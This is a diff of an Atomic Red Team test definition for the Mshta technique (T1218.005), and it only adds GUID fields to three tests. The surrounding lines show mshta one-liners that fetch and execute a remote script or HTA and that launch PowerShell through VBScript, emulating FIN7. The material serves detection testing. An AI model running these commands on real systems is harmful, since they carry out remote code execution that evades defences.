@@ -2,6 +2,7 @@ attack_technique: T1218.005
 display_name: Mshta
 atomic_tests:
 - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
+  auto_generated_guid: 1483fab9-4f52-4217-a9ce-daa9d7747cae
   description: |
     Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.
   supported_platforms:
@@ -16,6 +17,7 @@ atomic_tests:
       mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
     name: command_prompt
 - name: Mshta executes VBScript to execute malicious command
+  auto_generated_guid: 906865c3-e05f-4acc-85c4-fbc185455095
   description: |
     Run a local VB script to run local user enumeration powershell command.
     This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
@@ -27,6 +29,7 @@ atomic_tests:
       mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
     name: command_prompt
 - name: Mshta Executes Remote HTML Application (HTA)
+  auto_generated_guid: c4b97eeb-5249-4455-a607-59f95485cb45
   description: |
     Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
   supported_platforms:
